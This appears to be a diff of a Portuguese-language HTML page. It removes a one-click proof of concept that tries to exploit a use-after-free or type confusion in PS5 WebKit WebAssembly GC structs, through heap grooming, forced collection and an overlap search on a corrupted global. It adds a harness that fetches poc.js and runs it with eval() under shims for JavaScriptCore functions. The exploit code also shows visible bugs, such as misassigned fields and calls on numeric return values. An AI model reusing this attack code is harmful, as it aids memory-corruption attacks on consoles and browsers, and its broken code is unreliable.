@@ -1,157 +1,589 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-  <meta charset="utf-8">
-  <title>POC PS5 - TypeDefinition UAF (1 clique)</title>
-  <style>
-    body,html{margin:0;height:100%;background:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;}
-    button{padding:25px 60px;font-size:28px;background:#d00;color:#fff;border:none;border-radius:12px;cursor:pointer;box-shadow:0 6px 15px rgba(0,0,0,0.3);}
-    button:hover{background:#b00000;}
-    pre{margin-top:30px;background:#222;color:#0f0;padding:20px;width:90%;max-height:60vh;overflow:auto;border-radius:10px;font-size:16px;}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste POC.js - Ambiente de Navegador</title>
+    <style>
+        body {
+            background-color: white;
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            color: #333;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 4px;
+            margin: 10px 5px 20px 0;
+        }
+        
+        button:hover {
+            background-color: #45a049;
+        }
+        
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        button.secondary {
+            background-color: #2196F3;
+        }
+        
+        button.secondary:hover {
+            background-color: #0b7dda;
+        }
+        
+        button.danger {
+            background-color: #f44336;
+        }
+        
+        button.danger:hover {
+            background-color: #da190b;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+        
+        #status {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        
+        #output {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 20px;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            max-height: 500px;
+            overflow-y: auto;
+            min-height: 100px;
+        }
+        
+        .notes {
+            background-color: #e7f3fe;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .notes h3 {
+            margin-top: 0;
+            color: #0c5460;
+        }
+        
+        .code-fixes {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin: 20px 0;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            border-bottom: none;
+            margin-bottom: -1px;
+        }
+        
+        .tab.active {
+            background-color: white;
+            border-color: #ddd;
+            border-radius: 5px 5px 0 0;
+            font-weight: bold;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-top: none;
+            border-radius: 0 0 5px 5px;
+            background-color: white;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .patch-preview {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .info-box {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1>Teste POC.js - Ambiente de Navegador</h1>
+        
+        <div class="notes">
+            <h3>⚠️ Problemas Identificados:</h3>
+            <p>O código original usa funções específicas do JavaScriptCore que <strong>não existem em navegadores</strong>:</p>
+            <ul>
+                <li><code>load()</code> - Para carregar arquivos (apenas no JSC)</li>
+                <li><code>gc()</code> - Coleta de lixo manual (apenas no JSC)</li>
+                <li><code>print()</code> - Para output (use <code>console.log()</code> no navegador)</li>
+            </ul>
+        </div>
+        
+        <div class="button-group">
+            <button id="runOriginal" onclick="runOriginal()">Executar Original</button>
+            <button id="runPatched" onclick="runPatched()" class="secondary">Executar com Correções</button>
+            <button id="clearLogs" onclick="clearLogs()" class="danger">Limpar Logs</button>
+        </div>
+        
+        <div id="status"></div>
+        
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('console')">Console Output</div>
+            <div class="tab" onclick="showTab('patches')">Correções Aplicadas</div>
+        </div>
+        
+        <div id="console-tab" class="tab-content active">
+            <h3>Saída do Console:</h3>
+            <div id="output">Clique em um botão para executar...</div>
+        </div>
+        
+        <div id="patches-tab" class="tab-content">
+            <h3>Correções Necessárias:</h3>
+            <div class="info-box">
+                <p>Para executar no navegador, precisamos substituir:</p>
+                <ol>
+                    <li><code>load()</code> → Carregamento via fetch() + eval()</li>
+                    <li><code>gc()</code> → Tentativa de forçar GC (limitada)</li>
+                    <li><code>print()</code> → <code>console.log()</code></li>
+                    <li>Verificar APIs WebAssembly suportadas</li>
+                </ol>
+            </div>
+            
+            <div class="patch-preview" id="patchPreview">
+                // As correções serão exibidas aqui após execução
+            </div>
+        </div>
+    </div>
 
-<button id="btn">RODAR POC (PS5 WebKit)</button>
-<pre id="out">Clique no botão vermelho para executar o exploit...</pre>
-
-<script>
-// =============================================
-// 1. Verifica se WebAssembly existe (no PS5 às vezes demora)
-// =============================================
-function waitForWasm(callback) {
-  if (typeof WebAssembly !== 'undefined') {
-    callback();
-  } else {
-    document.getElementById("out").textContent += "\nAguardando WebAssembly carregar...";
-    setTimeout(() => waitForWasm(callback), 200);
-  }
-}
-
-// =============================================
-// 2. Força GC (funciona no PS5 sem precisar de gc())
-// =============================================
-function forceGC() {
-  const arr = [];
-  for (let i = 0; i < 30000; i++) {
-    arr.push(new ArrayBuffer(1024 * 1024));
-  }
-}
-
-// =============================================
-// 3. POC completo (totalmente auto-contido)
-// =============================================
-function runPOC() {
-  print("[+] Iniciando exploit TypeDefinition UAF - PS5");
-
-  // ---- módulo dummy pra forçar limpeza ----
-  let dummy = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0])));
-
-  // ---- módulo 1: cria dois globals com struct {i64} ----
-  const b1 = new WasmModuleBuilder();
-  const structIdx = b1.addStruct([makeField(0x7e, true)]); // i64
-  const init = [0x42, 0x81, 0x80, 0x80, 0x80, 0x01, 0xfb, 0x00, ...leb(structIdx)]; // 0x4141414141414141n + struct.new
-  b1.addGlobal(refNull(structIdx), true, init).exportAs("g1");
-  b1.addGlobal(refNull(structIdx), true, init).exportAs("g2");
-  let i1 = b1.instantiate();
-
-  // ---- módulo 2: 1000 tipos diferentes (um com f32 no meio) ----
-  const b2 = new WasmModuleBuilder();
-  const base = b2.addStruct([makeField(0x7e, true)]);
-  for (let i = 0; i < 1000; i++) {
-    let fields = [makeField(refNull(base), true)];
-    for (let j = 0; j < 1000; j++) {
-      fields.push(makeField(i===j ? 0x7d : 0x7f, true)); // f32 ou i32
-    }
-    let idx = b2.addStruct(fields);
-    let init2 = [0xd0, ...leb(base), ...Array(1000).fill(0).flatMap((_,k)=>i===k?[0x44,0,0,0,0,0,0,0,0]:[0x41,0]), 0xfb,0x00,...leb(idx)];
-    b2.addGlobal(ref(idx), true, init2);
-  }
-  let i2 = b2.instantiate();
-
-  // ---- libera tudo e força GC ----
-  i1 = null; dummy = null;
-  forceGC();
-  print("[+] Módulos liberados + GC forçado");
-
-  // ---- procura overlap ----
-  let overlap = -1;
-  for (let i = 0; i < 1000; i++) {
+    <script>
+        // Estado global
+        let originalPocCode = '';
+        let patchesApplied = [];
+        
+        // Configurar captura de logs
+        const outputDiv = document.getElementById('output');
+        let logs = [];
+        
+        function setupConsoleCapture() {
+            const originalLog = console.log;
+            const originalError = console.error;
+            const originalWarn = console.warn;
+            const originalInfo = console.info;
+            
+            console.log = function(...args) {
+                originalLog.apply(console, args);
+                const message = args.map(arg => 
+                    typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
+                ).join(' ');
+                logs.push('[LOG] ' + message);
+                updateOutput();
+            };
+            
+            console.error = function(...args) {
+                originalError.apply(console, args);
+                const message = args.map(arg => 
+                    typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
+                ).join(' ');
+                logs.push('[ERRO] ' + message);
+                updateOutput();
+            };
+            
+            console.warn = function(...args) {
+                originalWarn.apply(console, args);
+                const message = args.map(arg => 
+                    typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
+                ).join(' ');
+                logs.push('[AVISO] ' + message);
+                updateOutput();
+            };
+            
+            console.info = function(...args) {
+                originalInfo.apply(console, args);
+                const message = args.map(arg => 
+                    typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
+                ).join(' ');
+                logs.push('[INFO] ' + message);
+                updateOutput();
+            };
+        }
+        
+        function updateOutput() {
+            outputDiv.textContent = logs.join('\n');
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+        
+        function clearLogs() {
+            logs = [];
+            updateOutput();
+            hideStatus();
+        }
+        
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = type;
+            statusDiv.style.display = 'block';
+        }
+        
+        function hideStatus() {
+            document.getElementById('status').style.display = 'none';
+        }
+        
+        function showTab(tabName) {
+            // Esconder todas as tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Mostrar tab selecionada
+            document.getElementById(tabName + '-tab').classList.add('active');
+            document.querySelector(`.tab[onclick="showTab('${tabName}')"]`).classList.add('active');
+        }
+        
+        // Funções de emulação para o ambiente do navegador
+        function createBrowserCompatibilityLayer() {
+            patchesApplied = [];
+            
+            // Emular load() - função específica do JSC
+            if (typeof load === 'undefined') {
+                window.load = function(filename) {
+                    console.log(`[EMULAÇÃO] load() chamado para: ${filename}`);
+                    patchesApplied.push(`load("${filename}") → fetch() + eval()`);
+                    
+                    return new Promise(async (resolve, reject) => {
+                        try {
+                            const response = await fetch(filename);
+                            if (!response.ok) {
+                                throw new Error(`Falha ao carregar ${filename}: ${response.status}`);
+                            }
+                            const code = await response.text();
+                            eval(code);
+                            console.log(`[EMULAÇÃO] ${filename} carregado e executado`);
+                            resolve();
+                        } catch (error) {
+                            console.error(`[EMULAÇÃO] Erro ao carregar ${filename}:`, error.message);
+                            reject(error);
+                        }
+                    });
+                };
+                patchesApplied.push('Função load() criada (emulação fetch + eval)');
+            }
+            
+            // Emular gc() - coleta de lixo manual (limitada no navegador)
+            if (typeof gc === 'undefined') {
+                window.gc = function() {
+                    console.log('[EMULAÇÃO] gc() chamado - tentando forçar coleta de lixo');
+                    patchesApplied.push('gc() → Tentativa de forçar garbage collection');
+                    
+                    // Tentativas de forçar GC (funciona em alguns navegadores)
+                    if (window.gc) {
+                        return window.gc(); // Se já existir (Chrome com flag --js-flags="--expose-gc")
+                    }
+                    
+                    // Alternativa: criar e descartar muitos objetos
+                    for (let i = 0; i < 10000; i++) {
+                        let obj = {};
+                        obj.self = obj; // Referência circular
+                    }
+                    
+                    // Forçar garbage collection (funciona no Chrome com flag específica)
+                    if (window.PerformanceObserver) {
+                        try {
+                            new PerformanceObserver(() => {}).observe({type: 'gc'});
+                        } catch (e) {}
+                    }
+                    
+                    console.log('[EMULAÇÃO] Coleta de lixo solicitada (efetividade limitada)');
+                };
+                patchesApplied.push('Função gc() criada (emulação limitada)');
+            }
+            
+            // Emular print() se necessário
+            if (typeof print === 'undefined') {
+                window.print = function(...args) {
+                    console.log('[PRINT]', ...args);
+                    patchesApplied.push('print() → console.log()');
+                };
+            }
+            
+            // Verificar WebAssembly support
+            if (typeof WebAssembly === 'undefined') {
+                console.error('[ERRO CRÍTICO] WebAssembly não suportado neste navegador');
+                patchesApplied.push('WebAssembly não disponível');
+                return false;
+            }
+            
+            // Verificar APIs WebAssembly específicas
+            const wasmFeatures = {
+                gc: false,
+                bulkMemory: false,
+                referenceTypes: false,
+                simd: false
+            };
+            
+            // Testar funcionalidades (simplificado)
+            try {
+                // Testar referência types
+                const testModule = new WebAssembly.Module(new Uint8Array([
+                    0x00, 0x61, 0x73, 0x6d, // magic
+                    0x01, 0x00, 0x00, 0x00, // version
+                ]));
+                // Tentativas de detecção simplificadas
+                wasmFeatures.referenceTypes = WebAssembly.Global !== undefined;
+            } catch (e) {
+                console.warn('[AVISO] Algumas features WebAssembly podem não estar disponíveis');
+            }
+            
+            patchesApplied.push(`WebAssembly disponível: GC=${wasmFeatures.gc}, RefTypes=${wasmFeatures.referenceTypes}`);
+            return true;
+        }
+        
+        // Carregar e preparar o código
+        async function loadPocCode() {
+            try {
+                const response = await fetch('poc.js');
+                if (!response.ok) {
+                    throw new Error(`Falha ao carregar poc.js: ${response.status}`);
+                }
+                originalPocCode = await response.text();
+                return true;
+            } catch (error) {
+                console.error('Erro ao carregar poc.js:', error);
+                showStatus('Erro ao carregar poc.js: ' + error.message, 'error');
+                return false;
+            }
+        }
+        
+        // Executar código original (provavelmente falhará)
+        async function runOriginal() {
+            const button = document.getElementById('runOriginal');
+            button.disabled = true;
+            button.textContent = 'Executando...';
+            
+            clearLogs();
+            hideStatus();
+            logs = [];
+            
+            console.log('🚀 Executando código ORIGINAL (provavelmente falhará)...');
+            console.log('📅 Início: ' + new Date().toLocaleTimeString());
+            
+            if (!await loadPocCode()) {
+                button.disabled = false;
+                button.textContent = 'Executar Original';
+                return;
+            }
+            
+            try {
+                // Criar camada de compatibilidade básica
+                createBrowserCompatibilityLayer();
+                
+                // Executar o código original (talvez funcione com as emulações)
+                eval(originalPocCode);
+                
+                console.log('✅ Código original executado (com emulações)');
+                showStatus('Execução concluída com emulações', 'success');
+            } catch (error) {
+                console.error('💥 ERRO na execução:', error.message);
+                console.error('Stack trace:', error.stack);
+                showStatus('Erro: ' + error.message, 'error');
+            } finally {
+                button.disabled = false;
+                button.textContent = 'Executar Original';
+                console.log('🏁 Execução finalizada: ' + new Date().toLocaleTimeString());
+                
+                // Atualizar preview de patches
+                document.getElementById('patchPreview').textContent = 
+                    patchesApplied.join('\n') || 'Nenhuma correção aplicada';
+            }
+        }
+        
+        // Executar código com correções manuais
+        async function runPatched() {
+            const button = document.getElementById('runPatched');
+            button.disabled = true;
+            button.textContent = 'Executando...';
+            
+            clearLogs();
+            hideStatus();
+            logs = [];
+            patchesApplied = [];
+            
+            console.log('🔧 Executando código COM CORREÇÕES...');
+            console.log('📅 Início: ' + new Date().toLocaleTimeString());
+            
+            if (!await loadPocCode()) {
+                button.disabled = false;
+                button.textContent = 'Executar com Correções';
+                return;
+            }
+            
+            try {
+                // Criar camada de compatibilidade
+                createBrowserCompatibilityLayer();
+                
+                // Aplicar correções específicas
+                let patchedCode = originalPocCode;
+                
+                // 1. Substituir load() por carregamento assíncrono
+                if (patchedCode.includes('load("wasm-module-builder.js")')) {
+                    console.log('🔨 Aplicando correção para load()...');
+                    patchedCode = patchedCode.replace(
+                        'load("wasm-module-builder.js");',
+                        `// load() substituído por fetch()
+(async function() {
     try {
-      i1.exports.g1.value = i2.exports["global"+i].value;
-      overlap = i;
-      print(`[+] OVERLAP ENCONTRADO NO ÍNDICE ${i} !!!`);
-      break;
-    } catch(e) {}
-  }
-  if (overlap === -1) {
-    print("[-] Não conseguiu overlap (tente de novo)");
-    return;
-  }
-
-  // ---- módulo 3: importa o global corrompido ----
-  const b3 = new WasmModuleBuilder();
-  const badFields = [makeField(refNull(base), true)];
-  for (let j = 0; j < 1000; j++) badFields.push(makeField(j===overlap?0x7d:0x7f, true));
-  const badType = b3.addStruct(badFields);
-  b3.addImportedGlobal("imp","g", refNull(badType), true);
-  let i3 = b3.instantiate({imp: {g: i1.exports.g2}});
-
-  print("[!] Se tudo deu certo, o browser vai crashar agora...");
-  print("[!] (ou você vai ver um ponteiro 0x41414141... lindo)");
+        const response = await fetch('wasm-module-builder.js');
+        const code = await response.text();
+        eval(code);
+        console.log('wasm-module-builder.js carregado com sucesso');
+    } catch (e) {
+        console.error('Falha ao carregar wasm-module-builder.js:', e);
+        throw e;
+    }
+})();`
+                    );
+                    patchesApplied.push('load("wasm-module-builder.js") substituído por fetch assíncrono');
+                }
+                
+                // 2. Substituir print() por console.log()
+                patchedCode = patchedCode.replace(/print\(/g, 'console.log(');
+                if (originalPocCode.includes('print(')) {
+                    patchesApplied.push('print() substituído por console.log()');
+                }
+                
+                // 3. Adicionar verificações de WebAssembly
+                if (patchedCode.includes('new WasmModuleBuilder')) {
+                    patchedCode = `// Verificação inicial de WebAssembly
+if (typeof WebAssembly === 'undefined') {
+    console.error('WebAssembly não suportado');
+    throw new Error('WebAssembly required');
 }
 
-// =============================================
-// Mini WasmModuleBuilder (só o necessário)
-// =============================================
-class WasmModuleBuilder {
-  constructor(){this.types=[];this.globals=[];this.imports=[];this.exports=[];}
-  addStruct(f){this.types.push({form:0x5f,fields:f});return this.types.length-1;}
-  addGlobal(t,m,i){this.globals.push({type:t,mut:i,init:i});return this.globals.length-1;}
-  addImportedGlobal(m,f,t,mute){this.imports.push({mod:m,field:f,type:t,mut:mute});return this.imports.length-1;}
-  exportAs(n,i){this.exports.push({name:n,kind:3,index:i});}
-  instantiate(ffi={}) {
-    const bin = this.toBuffer();
-    const mod = new WebAssembly.Module(bin);
-    return new WebAssembly.Instance(mod, ffi);
-  }
-  toBuffer() {
-    const bin = [0,97,115,109,1,0,0,0];
-    const emit = (...b)=>bin.push(...b);
-    const u32 = v=>{let a=[];while(v>=0x80){a.push(v&0x7f|0x80);v>>>=7;}a.push(v);emit(...a);}
-    const leb = v=>{let a=[];while(true){let b=v&0x7f;v>>=7;if((b&0x40)?(v>=-1&&v<0):v===0){a.push(b);return a;}a.push(b|0x80);}}
-
-    // Type section
-    if(this.types.length){emit(1);let sec=[];u32(this.types.length);this.types.forEach(t=>{sec.push(0x5f);u32(t.fields.length);t.fields.forEach(f=>{sec.push(f.type.opcode||f.type);sec.push(f.mutability?1:0);});});u32(sec.length);emit(...sec);}
-
-    // Import section
-    if(this.imports.length){emit(2);let sec=[];u32(this.imports.length);this.imports.forEach(imp=>{u32(imp.mod.length);emit(...new TextEncoder().encode(imp.mod));u32(imp.field.length);emit(...new TextEncoder().encode(imp.field));emit(3);emit(imp.type.opcode||imp.type);emit(imp.mut?1:0);});u32(sec.length);emit(...sec);}
-
-    // Global section
-    if(this.globals.length){emit(6);let sec=[];u32(this.globals.length);this.globals.forEach(g=>{sec.push(g.type.opcode||g.type);sec.push(g.mut?1:0);sec.push(...g.init,0x0b);});u32(sec.length);emit(...sec);}
-
-    // Export section
-    if(this.exports.length){emit(7);let sec=[];u32(this.exports.length);this.exports.forEach(e=>{u32(e.name.length);emit(...new TextEncoder().encode(e.name));emit(e.kind);u32(e.index);});u32(sec.length);emit(...sec);}
-
-    return new Uint8Array(bin).buffer;
-  }
+// Verificar WebAssembly.Global para referências
+if (typeof WebAssembly.Global === 'undefined') {
+    console.warn('WebAssembly.Global não disponível - referência types podem falhar');
 }
 
-function refNull(t){return {opcode:0x63,heap_type:t};}
-function ref(t){return {opcode:0x64,heap_type:t};}
-
-function print(t){document.getElementById("out").textContent += t + "\n";}
-
-// =============================================
-// Botão
-// =============================================
-document.getElementById("btn").onclick = () => {
-  document.getElementById("out").textContent = "Carregando WebAssembly...\n";
-  waitForWasm(() => {
-    document.getElementById("out").textContent = "";
-    try { runPOC(); } catch(e) { print("ERRO: " + e + "\n" + e.stack); }
-  });
-};
-</script>
+${patchedCode}`;
+                    patchesApplied.push('Verificações de WebAssembly adicionadas');
+                }
+                
+                console.log('✅ Código corrigido aplicado');
+                console.log('📝 Patches aplicados:', patchesApplied.length);
+                
+                // Executar código corrigido
+                eval(patchedCode);
+                
+                console.log('✅ Código corrigido executado');
+                showStatus('Execução com correções concluída', 'success');
+            } catch (error) {
+                console.error('💥 ERRO na execução corrigida:', error.message);
+                console.error('Stack trace:', error.stack);
+                showStatus('Erro: ' + error.message, 'error');
+            } finally {
+                button.disabled = false;
+                button.textContent = 'Executar com Correções';
+                console.log('🏁 Execução finalizada: ' + new Date().toLocaleTimeString());
+                
+                // Atualizar preview de patches
+                document.getElementById('patchPreview').textContent = 
+                    patchesApplied.join('\n') || 'Nenhuma correção aplicada';
+            }
+        }
+        
+        // Inicialização
+        document.addEventListener('DOMContentLoaded', async function() {
+            setupConsoleCapture();
+            
+            // Verificar se os arquivos existem
+            try {
+                const response = await fetch('poc.js');
+                if (!response.ok) {
+                    outputDiv.textContent = '❌ ERRO: Arquivo poc.js não encontrado!\n\nColoque este arquivo HTML na mesma pasta que:\n1. poc.js\n2. wasm-module-builder.js (opcional)\n\nO código foi projetado para JavaScriptCore, não para navegadores.';
+                } else {
+                    console.log('✅ poc.js encontrado');
+                }
+            } catch (error) {
+                outputDiv.textContent = '❌ ERRO: Não foi possível verificar os arquivos.\n' + error.message;
+            }
+        });
+    </script>
 </body>
 </html>
